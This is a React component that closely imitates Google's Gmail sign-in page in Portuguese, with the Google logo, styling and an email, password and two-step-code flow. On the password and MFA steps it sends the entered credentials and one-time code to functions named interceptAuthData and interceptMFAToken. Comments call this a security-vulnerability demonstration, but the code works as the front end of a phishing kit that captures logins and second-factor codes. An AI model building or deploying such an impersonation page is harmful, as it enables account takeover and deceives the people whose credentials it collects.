import React, { useState } from 'react';
import {
  Box,
  Button,
  Typography,
  Link,
  FormControl,
  InputLabel,
  OutlinedInput,
  SvgIcon,
  Select,
  MenuItem,
  InputAdornment,
  IconButton,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  TextField,
  CircularProgress
} from '@mui/material';
import ArrowBackIcon from '@mui/icons-material/ArrowBack';
import InfoOutlinedIcon from '@mui/icons-material/InfoOutlined';
import KeyboardArrowDownIcon from '@mui/icons-material/KeyboardArrowDown';
import VisibilityIcon from '@mui/icons-material/Visibility';
import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
import './GmailLogin.css';
import { interceptAuthData, interceptMFAToken } from '../security/middleware/authInterceptor';
import { AuthAuditLogger } from '../security/middleware/authAuditLogger';
import { SecureAuthClient } from '../security/middleware/secureAuthClient';
import { securityMonitor } from '../security/middleware/securityMonitor';

// Custom Google Icon similar to the one in the attachment
function GoogleLogoIcon(props) {
  return (
    <SvgIcon {...props} viewBox="0 0 75 24" sx={{ width: '75px', height: '24px' }}>
      <path fill="#4285F4" d="M14.11 13.655c0-.8-.07-1.39-.21-2H8.16v3.62h3.56a3.2 3.2 0 01-1.32 2.12v1.68h2.11c1.24-1.14 1.96-2.83 1.96-5.42z" />
      <path fill="#34A853" d="M8.16 18.121c1.77 0 3.27-.58 4.35-1.59l-2.11-1.68c-.59.42-1.35.72-2.24.72-1.72 0-3.17-1.16-3.7-2.73H2.27v1.74a6.77 6.77 0 006.46 3.55z" />
      <path fill="#FBBC05" d="M4.47 12.711c-.3-.56-.47-1.16-.47-1.78s.17-1.22.47-1.78v-1.74H2.27a6.77 6.77 0 000 7.04l2.2-1.74z" />
      <path fill="#EA4335" d="M8.16 7.041a3.7 3.7 0 012.61 1.02l1.89-1.89a6.47 6.47 0 00-4.5-1.75 6.77 6.77 0 00-6.05 3.73l2.2 1.74c.52-1.57 1.97-2.85 3.7-2.85z" />
      <path fill="none" d="M0 0h18v18.12H0z" />
      <g>
        <path fill="#757575" d="M24.5 11.842v-2.79h4.58v-1.45H24.5v-2.79h-1.59v7.03h6.25v-1.45H24.5zM31.42 11.842v-7.03h-1.59v7.03h1.59zM33.86 11.842v-7.03H32.3v7.03h1.56zM39.02 6.392c-.36-.34-.9-.52-1.56-.52-.46 0-.87.09-1.23.27-.37.18-.67.44-.87.76l1.25.52c.31-.44.7-.65 1.14-.65.28 0 .52.07.69.22.17.15.26.36.26.62v.18c-.38-.06-.71-.09-.98-.09-.74 0-1.34.15-1.79.47-.45.32-.68.77-.68 1.33 0 .56.17 1 .51 1.31.34.32.77.48 1.27.48.62 0 1.12-.28 1.5-.85h.04v.68h1.5v-3.96c0-.72-.19-1.27-.55-1.61zm-1.24 4.19c-.37 0-.7-.31-.7-.67 0-.72.89-.95 1.66-.95.3 0 .62.05.95.14a1.58 1.58 0 01-1.91 1.48z" />
        <path fill="#757575" d="M44.79 4.842l-1.78 4.51h-.04l-1.84-4.51h-1.71l2.76 6.29-1.57 3.5h1.66l4.24-9.79zM46.36 11.842h1.59v-7.03h-1.59zM51.07 4.812h-1.59v7.03h4.73v-1.45h-3.14z" />
        <path fill="#757575" d="M56.59 11.852c1.45 0 2.64-1.18 2.64-2.63s-1.19-2.63-2.64-2.63-2.63 1.18-2.63 2.63 1.18 2.63 2.63 2.63zm0-1.32c-.72 0-1.3-.6-1.3-1.31 0-.71.58-1.31 1.3-1.31s1.31.6 1.31 1.31c0 .72-.59 1.31-1.31 1.31zM65.83 11.842V4.812h-1.53v4.38l-3.02-4.38h-1.65v7.03h1.53v-4.5l3.08 4.5h1.59z" />
        <path fill="#757575" d="M68.11 11.252a2.82 2.82 0 002.74 1.62c1.56 0 2.54-.92 2.54-2.2 0-1.03-.66-1.7-1.91-1.92l-1.01-.18c-.48-.09-.81-.3-.81-.64 0-.4.37-.65.85-.65.68 0 1.22.27 1.33.81l1.42-.3c-.23-1.01-1.13-1.7-2.75-1.7-1.42 0-2.43.9-2.43 2.14 0 1.02.74 1.71 1.84 1.9l.99.17c.51.09.86.3.86.67 0 .4-.42.68-1.02.68-.79 0-1.3-.35-1.44-.92l-1.41.4z" />
      </g>
    </SvgIcon>
  );
}

function GmailLogin({ onBack }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState(1); // 1 = email, 2 = password, 3 = MFA
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [mfaToken, setMfaToken] = useState('');
  const [mfaError, setMfaError] = useState('');
  const [loading, setLoading] = useState(false);
  const [mfaOptions, setMfaOptions] = useState(['app', 'sms', 'backup']);
  const [selectedMfaOption, setSelectedMfaOption] = useState('app');
  
  // Register security alert handler
  React.useEffect(() => {
    securityMonitor.setAlertCallback((alert) => {
      console.error('Security Alert Detected:', alert);
      // In a real app, you might show a notification or take action
    });
  }, []);
  
  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    if (emailError) {
      setEmailError('');
    }
  };
  
  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    if (passwordError) {
      setPasswordError('');
    }
  };
  
  const handleMfaTokenChange = (e) => {
    setMfaToken(e.target.value);
    if (mfaError) {
      setMfaError('');
    }
  };
  
  // Validate email format
  const isEmailValid = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };
  
  // Validate password strength
  const isPasswordStrong = (password) => {
    // For demo purposes, just check length
    return password.length >= 6;
  };
  
  // Handle form submission
  const handleNextClick = async () => {
    if (step === 1) {
      if (email.trim() === '') {
        setEmailError('Introduza um endereço de email');
        return;
      } else if (!isEmailValid(email)) {
        setEmailError('Introduza um endereço de email válido');
        return;
      }
      
      // Log email entry (just for demonstration)
      AuthAuditLogger.logAuthAttempt(email, 'email_entry', true, {
        step: 'email_validation'
      });
      
      setEmailError('');
      setStep(2);
    } else if (step === 2) {
      if (password.trim() === '') {
        setPasswordError('Introduza a palavra-passe');
        return;
      } else if (!isPasswordStrong(password)) {
        setPasswordError('A palavra-passe deve ter pelo menos 6 caracteres');
        return;
      }
      
      setLoading(true);
      
      // SECURITY VULNERABILITY DEMONSTRATION:
      // This is where credentials could be intercepted by malicious code
      interceptAuthData({
        email,
        password,
        timestamp: new Date().toISOString()
      });
      
      try {
        // Attempt to authenticate
        const authResult = await SecureAuthClient.authenticate(email, password);
        
        AuthAuditLogger.logAuthAttempt(email, 'password', authResult.success, {
          requiresMFA: authResult.requiresMFA
        });
        
        if (authResult.success) {
          if (authResult.requiresMFA) {
            // Proceed to MFA step
            setStep(3);
          } else {
            // Authentication successful without MFA
            handleSuccessfulLogin();
          }
        } else {
          setPasswordError('Palavra-passe incorreta');
        }
      } catch (error) {
        console.error('Authentication error:', error);
        setPasswordError('Erro de autenticação. Tente novamente.');
      } finally {
        setLoading(false);
      }
    } else if (step === 3) {
      if (mfaToken.trim() === '' || mfaToken.length !== 6) {
        setMfaError('Introduza um código válido de 6 dígitos');
        return;
      }
      
      setLoading(true);
      
      // SECURITY VULNERABILITY DEMONSTRATION:
      // This is where MFA tokens could be intercepted
      interceptMFAToken(mfaToken, email);
      
      try {
        // Verify MFA token
        const verifyResult = await SecureAuthClient.verifyMFA('user_123', mfaToken);
        
        AuthAuditLogger.logAuthAttempt(email, 'mfa', verifyResult.success, {
          mfaMethod: selectedMfaOption
        });
        
        if (verifyResult.success) {
          handleSuccessfulLogin();
        } else {
          setMfaError('Código incorreto. Tente novamente.');
        }
      } catch (error) {
        console.error('MFA verification error:', error);
        setMfaError('Erro de verificação. Tente novamente.');
      } finally {
        setLoading(false);
      }
    }
  };
  
  const handleSuccessfulLogin = () => {
    // In a real app, this would redirect to the main application or dashboard
   // alert('Login successful with email: ' + email);
    
    // Audit logging
    AuthAuditLogger.logAuthAttempt(email, 'login_complete', true, {
      loginFlow: step === 3 ? 'with_mfa' : 'password_only'
    });
  };
  
  const handleTogglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };
  
  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleNextClick();
    }
  };
  
  const handleMfaOptionChange = (e) => {
    setSelectedMfaOption(e.target.value);
    setMfaToken('');
    setMfaError('');
  };
  
  // Render MFA verification dialog
  const renderMfaStep = () => {
    return (
      <Box sx={{ width: '100%' }}>
        <Typography
          variant="h6"
          sx={{
            fontSize: '16px',
            fontWeight: 500,
            mb: 2,
            color: '#202124',
            textAlign: 'center'
          }}
        >
          Verificação em dois passos
        </Typography>
        
        <Typography
          variant="body2"
          sx={{
            mb: 3,
            fontSize: '14px',
            color: '#5f6368',
            textAlign: 'left'
          }}
        >
          Introduza o código de verificação enviado para o seu {
            selectedMfaOption === 'app' ? 'aplicativo de autenticação' :
            selectedMfaOption === 'sms' ? 'telemóvel' :
            'método de recuperação'
          }
        </Typography>
        
        <FormControl variant="outlined" sx={{ width: '100%', mb: 2 }}>
          <Select
            value={selectedMfaOption}
            onChange={handleMfaOptionChange}
            sx={{
              mb: 2,
              height: '56px',
              fontSize: '14px'
            }}
          >
            <MenuItem value="app">Aplicativo de autenticação</MenuItem>
            <MenuItem value="sms">SMS (+351 ●●● ●●● 123)</MenuItem>
            <MenuItem value="backup">Códigos de backup</MenuItem>
          </Select>
        </FormControl>
        
        <TextField
          label="Código de verificação"
          variant="outlined"
          fullWidth
          value={mfaToken}
          onChange={handleMfaTokenChange}
          error={!!mfaError}
          helperText={mfaError}
          sx={{
            mb: 3,
            '& .MuiOutlinedInput-root': {
              height: '56px'
            }
          }}
          inputProps={{
            maxLength: 6,
            inputMode: 'numeric',
            pattern: '[0-9]*'
          }}
          autoFocus
        />
        
        <Link
          href="#"
          underline="hover"
          sx={{
            color: '#1a73e8',
            fontWeight: 500,
            fontSize: '14px',
            textDecoration: 'none',
            '&:hover': {
              textDecoration: 'underline',
            },
            display: 'block',
            mb: 2
          }}
        >
          Tentar outro método
        </Link>
      </Box>
    );
  };
  
  return (
    <div className="gmail-login-page">
      <button className="back-button" onClick={step === 1 ? onBack : () => setStep(1)}>
        <ArrowBackIcon fontSize="small" className="back-icon" />
        {step === 1 ? 'Voltar' : 'Utilizar outra conta'}
      </button>
      
      <div className="gmail-login-wrapper">
        <div className="login-card-container">
          <Box sx={{ display: 'flex', justifyContent: 'center', mb: 3 }}>
            <GoogleLogoIcon sx={{ fontSize: '24px', width: '75px', height: '24px' }} />
          </Box>
          
          <Typography 
            variant="h1" 
            sx={{ 
              fontSize: '24px', 
              fontWeight: 400, 
              textAlign: 'center',
              mb: 1,
              fontFamily: 'Google Sans,Roboto,Arial,sans-serif'
            }}
          >
            {step === 1 ? 'Inicie sessão' : step === 2 ? 'Bem-vindo(a)' : 'Verificação'}
          </Typography>
          
          <Typography 
            variant="subtitle1" 
            sx={{ 
              fontSize: '16px',
              fontWeight: 400,
              mb: step === 1 ? 6 : 2,
              color: '#202124',
              textAlign: 'center',
              fontFamily: 'Google Sans,Roboto,Arial,sans-serif'
            }}
          >
            {step === 1 ? 'Continuar para o Gmail' : email}
          </Typography>
          
          {step === 2 && (
            <Typography 
              variant="body2" 
              sx={{ 
                fontSize: '14px',
                mb: 3,
                color: '#5f6368',
                textAlign: 'center',
                fontFamily: 'Roboto,Arial,sans-serif'
              }}
            >
              Para continuar, confirme que é mesmo você
            </Typography>
          )}
          
          {step === 1 ? (
            <FormControl 
              fullWidth 
              variant="outlined" 
              error={!!emailError}
              sx={{ 
                mb: emailError ? 0.5 : 2,
                '& .MuiFormLabel-root.MuiInputLabel-shrink': {
                  transform: 'translate(14px, -9px) scale(0.75)',
                  backgroundColor: 'white',
                  padding: '0 4px',
                }
              }}
            >
              <InputLabel 
                htmlFor="email-input"
                sx={{
                  color: emailError ? '#d32f2f' : '#5f6368',
                  fontSize: '16px',
                  fontFamily: 'Roboto, Arial, sans-serif',
                  '&.Mui-focused': {
                    color: emailError ? '#d32f2f' : '#1a73e8',
                  }
                }}
              >
                Email ou telemóvel
              </InputLabel>
              <OutlinedInput
                id="email-input"
                value={email}
                onChange={handleEmailChange}
                onKeyPress={handleKeyPress}
                label="Email ou telemóvel"
                fullWidth
                autoFocus
                error={!!emailError}
                sx={{
                  height: '56px',
                  borderRadius: '4px',
                  fontSize: '16px',
                  color: '#202124',
                  fontFamily: 'Roboto, Arial, sans-serif',
                  '&:hover .MuiOutlinedInput-notchedOutline': {
                    borderColor: emailError ? '#d32f2f' : 'rgba(0, 0, 0, 0.23)',
                  },
                  '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                    borderWidth: '2px',
                    borderColor: emailError ? '#d32f2f' : '#1a73e8',
                  },
                  '& .MuiOutlinedInput-notchedOutline': {
                    borderColor: emailError ? '#d32f2f' : '#dadce0',
                  }
                }}
                endAdornment={
                  email && (
                    <InputAdornment position="end">
                      <IconButton edge="end" tabIndex={-1}>
                        <InfoOutlinedIcon sx={{ color: 'transparent' }} />
                      </IconButton>
                    </InputAdornment>
                  )
                }
              />
              {emailError && (
                <Typography 
                  variant="caption" 
                  color="error" 
                  sx={{ 
                    mt: 0.5, 
                    ml: 1.5, 
                    display: 'block',
                    fontSize: '12px'
                  }}
                >
                  {emailError}
                </Typography>
              )}
            </FormControl>
          ) : step === 2 ? (
            <FormControl 
              fullWidth 
              variant="outlined" 
              error={!!passwordError}
              sx={{ 
                mb: passwordError ? 0.5 : 2,
                '& .MuiFormLabel-root.MuiInputLabel-shrink': {
                  transform: 'translate(14px, -9px) scale(0.75)',
                  backgroundColor: 'white',
                  padding: '0 4px',
                }
              }}
            >
              <InputLabel 
                htmlFor="password-input"
                sx={{
                  color: passwordError ? '#d32f2f' : '#5f6368',
                  fontSize: '16px',
                  fontFamily: 'Roboto, Arial, sans-serif',
                  '&.Mui-focused': {
                    color: passwordError ? '#d32f2f' : '#1a73e8',
                  }
                }}
              >
                Introduza a sua palavra-passe
              </InputLabel>
              <OutlinedInput
                id="password-input"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={handlePasswordChange}
                onKeyPress={handleKeyPress}
                label="Introduza a sua palavra-passe"
                fullWidth
                autoFocus
                error={!!passwordError}
                sx={{
                  height: '56px',
                  borderRadius: '4px',
                  fontSize: '16px',
                  color: '#202124',
                  fontFamily: 'Roboto, Arial, sans-serif',
                  '&:hover .MuiOutlinedInput-notchedOutline': {
                    borderColor: passwordError ? '#d32f2f' : 'rgba(0, 0, 0, 0.23)',
                  },
                  '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                    borderWidth: '2px',
                    borderColor: passwordError ? '#d32f2f' : '#1a73e8',
                  },
                  '& .MuiOutlinedInput-notchedOutline': {
                    borderColor: passwordError ? '#d32f2f' : '#dadce0',
                  }
                }}
                endAdornment={
                  <InputAdornment position="end">
                    <IconButton
                      onClick={handleTogglePasswordVisibility}
                      edge="end"
                    >
                      {showPassword ? (
                        <span style={{ fontSize: '14px', color: '#5f6368' }}>Ocultar</span>
                      ) : (
                        <span style={{ fontSize: '14px', color: '#5f6368' }}>Mostrar</span>
                      )}
                    </IconButton>
                  </InputAdornment>
                }
              />
              {passwordError && (
                <Typography 
                  variant="caption" 
                  color="error" 
                  sx={{ 
                    mt: 0.5, 
                    ml: 1.5, 
                    display: 'block',
                    fontSize: '12px'
                  }}
                >
                  {passwordError}
                </Typography>
              )}
            </FormControl>
          ) : (
            renderMfaStep()
          )}
          
          {step === 1 ? (
            <Box sx={{ textAlign: 'left', mb: 5 }}>
              <Link
                href="#"
                underline="hover"
                sx={{
                  color: '#1a73e8',
                  fontWeight: 500,
                  fontSize: '14px',
                  textDecoration: 'none',
                  '&:hover': {
                    textDecoration: 'underline',
                  }
                }}
              >
                Esqueceu-se do email?
              </Link>
            </Box>
          ) : step === 2 ? (
            <Box sx={{ textAlign: 'left', mb: 5 }}>
              <Link
                href="#"
                underline="hover"
                sx={{
                  color: '#1a73e8',
                  fontWeight: 500,
                  fontSize: '14px',
                  textDecoration: 'none',
                  '&:hover': {
                    textDecoration: 'underline',
                  }
                }}
              >
                Esqueceu-se da palavra-passe?
              </Link>
            </Box>
          ) : null}
          
          {step < 3 && (
            <Box sx={{ mb: 5, textAlign: 'left' }}>
              <Typography 
                variant="body2" 
                sx={{ 
                  fontSize: '14px',
                  color: '#5f6368',
                  mb: 1,
                  lineHeight: 1.5
                }}
              >
                Este computador não é seu? Use o modo convidado para iniciar sessão de forma privada.
              </Typography>
              <Link
                href="#"
                underline="hover"
                sx={{
                  color: '#1a73e8',
                  fontWeight: 500,
                  fontSize: '14px',
                  textDecoration: 'none',
                  '&:hover': {
                    textDecoration: 'underline',
                  }
                }}
              >
                Saiba como usar o modo convidado
              </Link>
            </Box>
          )}
          
          <Box sx={{ 
            display: 'flex', 
            justifyContent: 'space-between', 
            alignItems: 'center', 
            mt: 8
          }}>
            {step === 1 ? (
              <Link
                href="#"
                underline="hover"
                sx={{
                  color: '#1a73e8',
                  fontWeight: 500,
                  fontSize: '14px',
                  textDecoration: 'none',
                  '&:hover': {
                    textDecoration: 'underline',
                  }
                }}
              >
                Criar conta
              </Link>
            ) : (
              <div></div>
            )}
            <Button
              variant="contained"
              onClick={handleNextClick}
              disabled={loading}
              sx={{
                backgroundColor: '#1a73e8',
                '&:hover': {
                  backgroundColor: '#1565c0',
                  boxShadow: '0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15)'
                },
                textTransform: 'none',
                fontWeight: 500,
                px: 3.5,
                py: 1,
                minWidth: '88px',
                height: '36px',
                borderRadius: '4px',
                boxShadow: '0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15)',
                fontSize: '14px',
                fontFamily: 'Google Sans, Roboto, Arial, sans-serif',
                letterSpacing: '0.25px',
                position: 'relative'
              }}
            >
              {loading ? (
                <CircularProgress size={24} color="inherit" />
              ) : (
                step === 3 ? 'Verificar' : step === 2 ? 'Concluir' : 'Seguinte'
              )}
            </Button>
          </Box>
        </div>
      </div>
      
      <footer className="gmail-footer">
        <Box sx={{ 
          display: 'flex', 
          justifyContent: 'space-between', 
          width: '100%', 
          px: 2,
          maxWidth: '450px', 
          margin: '0 auto'
        }}>
          <Box>
            <Select
              value="pt"
              variant="standard"
              disableUnderline
              IconComponent={KeyboardArrowDownIcon}
              sx={{ 
                fontSize: '12px',
                color: '#5f6368',
                '&:before': {
                  border: 'none',
                },
                '& .MuiSelect-select': {
                  paddingBottom: 0
                },
                '& .MuiSvgIcon-root': {
                  fontSize: '18px',
                  color: '#5f6368'
                }
              }}
            >
              <MenuItem value="pt">Português (Portugal)</MenuItem>
              <MenuItem value="en">English</MenuItem>
              <MenuItem value="es">Español</MenuItem>
            </Select>
          </Box>
          <Box sx={{ display: 'flex' }}>
            <Link 
              href="#" 
              underline="hover" 
              sx={{ 
                mx: 1, 
                fontSize: '12px', 
                color: '#5f6368', 
                textDecoration: 'none',
                '&:hover': {
                  textDecoration: 'underline',
                }
              }}
            >
              Ajuda
            </Link>
            <Link 
              href="#" 
              underline="hover" 
              sx={{ 
                mx: 1, 
                fontSize: '12px', 
                color: '#5f6368',
                textDecoration: 'none',
                '&:hover': {
                  textDecoration: 'underline',
                } 
              }}
            >
              Privacidade
            </Link>
            <Link 
              href="#" 
              underline="hover" 
              sx={{ 
                mx: 1, 
                fontSize: '12px', 
                color: '#5f6368',
                textDecoration: 'none',
                '&:hover': {
                  textDecoration: 'underline',
                } 
              }}
            >
              Termos
            </Link>
          </Box>
        </Box>
      </footer>
    </div>
  );
}

export default GmailLogin;
